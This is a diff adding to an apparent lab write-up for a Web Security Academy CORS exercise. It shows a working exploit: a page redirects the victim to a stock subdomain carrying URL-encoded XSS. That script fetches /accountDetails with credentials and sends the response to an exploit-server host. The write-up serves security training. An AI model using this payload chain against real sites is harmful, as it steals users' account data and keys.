@@ -303,3 +303,60 @@ The decoded version being:
 </html>
 ```
 
+Another version is the following:
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Document</title>
+    </head>
+    <body>
+        <h1>Hello</h1>
+
+        <script>
+            window.location ="http://stock.ID.web-security-academy.net/?productId=&storeId=3"
+        </script>
+    </body>
+</html>
+```
+
+With the following being URL encoded and put after the `productId=` parameter - where XSS is present:
+
+```html
+<script>
+    const request = new XMLHttpRequest()
+
+    request.open("get", "https://ID.web-security-academy.net/accountDetails", true)
+
+    request.onload= ()=>{
+        window.location = "https://exploit-ID.exploit-server.net/exploit?key=" + request.responseText
+    }
+
+    request.withCredentials = true
+    request.send()
+</script>
+```
+
+After URL encoding and combining with the main payload:
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Document</title>
+    </head>
+    <body>
+        <h1>Hello</h1>
+
+        <script>
+            window.location ="http://stock.ID.web-security-academy.net/?productId=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%63%6f%6e%73%74%20%72%65%71%75%65%73%74%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%0a%0a%20%20%20%20%72%65%71%75%65%73%74%2e%6f%70%65%6e%28%22%67%65%74%22%2c%20%22%68%74%74%70%73%3a%2f%2f%49%44%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%22%2c%20%74%72%75%65%29%0a%0a%20%20%20%20%72%65%71%75%65%73%74%2e%6f%6e%6c%6f%61%64%3d%20%28%29%3d%3e%7b%0a%20%20%20%20%20%20%20%20%77%69%6e%64%6f%77%2e%6c%6f%63%61%74%69%6f%6e%20%3d%20%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%49%44%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6b%65%79%3d%22%20%2b%20%72%65%71%75%65%73%74%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%0a%20%20%20%20%7d%0a%0a%20%20%20%20%72%65%71%75%65%73%74%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%0a%20%20%20%20%72%65%71%75%65%73%74%2e%73%65%6e%64%28%29%0a%3c%2f%73%63%72%69%70%74%3e&storeId=3"
+        </script>
+    </body>
+</html>
+```
+
